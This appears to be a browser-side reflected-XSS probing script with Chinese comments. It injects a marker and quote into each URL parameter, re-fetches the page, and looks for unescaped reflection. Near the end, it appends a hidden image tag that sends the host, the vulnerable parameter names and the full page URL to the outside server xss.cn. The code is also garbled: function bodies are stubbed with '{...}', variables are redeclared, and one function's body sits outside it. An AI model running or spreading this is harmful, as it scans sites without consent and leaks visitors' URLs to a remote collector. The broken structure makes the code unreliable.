function xssCheck(){

	var onlyString = 'woainixss<>'; //唯一标识符
	var protocol = window.location.protocol;  //网站使用的网络协议(http、https等)
	var host = window.location.host;   //网站的主域名(*.com、*.cn等，例：test.cn)
	var href = window.location.href;   //网站的完整URL(协议+域名+参数+锚)
	var hostPath; //用来存放网站除去参数的字符串(协议+域名+锚)
	var urlPath;  //用来存放网站URL路径的数组(例：test.cn/test/xss/123  urlPath = ['test','xss’,'123'])

	if(href.indexOf("?") != "-1"){  //如果url存在?字符串(存在?基本就存在参数了)
    		hostPath = href.slice(0,href.indexOf("?"));      //去除参数，只留下“协议+域名+锚”
	}else{
    		hostPath = href;  //不存在?则把完整的url赋值给hostPath。
	}

	urlPath = hostPath.split("/").splice(3);      //以“/”为分隔符，把路径分割成数组。



	if(location.search != ""){  //当参数不为空时，跳转到parameter_Xss函数里
    		parameter_Xss();
	}
	if(href.split("/")[3] != ""){      //当完整的URL里第三个/后存在字符串，则跳转到pseudoStatic_Xss函数里
    		pseudoStatic_Xss();
	}
	if($("form").length > 0){       //当页面存在form表单，就跳转到form_Xss函数里
    		form_Xss();
	}

	function parameter_Xss(){...}      //URL参数检测XSS
	function pseudoStatic_Xss(){...}       //伪静态检测XSS
	function form_Xss(){...}     //form表单检测XSS

	var onlyString = 'woainixss';
	var protocol = window.location.protocol;
	var hrefHost = window.location.host;
	var parameter = location.search.substring(1).split("&");
	var url = protocol + "//" + host + "/" + urlPath.join("/") + "?";
	for(var i = 0;i < parameter.length;i++){
    		url += parameter[i].split("=")[0] + "=" + onlyString + parameter[i].split("=")[1] + '"&';
	}


    url = url.substring(0,url.length-1);
    $.ajax({
        url: url,
        type: 'get',
        dataType: 'text',
    })
    .done(function(data) {
        var xss = "";
        for(i = 0;i < parameter.length;i++){
            if(data.indexOf(onlyString + parameter[i].split("=")[1] + '"') != "-1"){
                xss += parameter[i].split("=")[0] + "|";
            }
        }
        if(xss == ""){
            return false;
        }else{
            xss = xss.substring(0,xss.length-1);
            //img标签里的src属性，为你的服务器地址。
            //如果不想加上远程地址，可以吧下面的代码修改为alert(xss)
            $("body").append("<img src='http://xss.cn/xss.html?host=$" + hrefHost + "&$xss=$" + xss + "&$url=$" + window.location.href + "&$rand=$" + Date.parse(new Date()) + "' style='display:none;'>");
        }
    })
}
xssCheck();
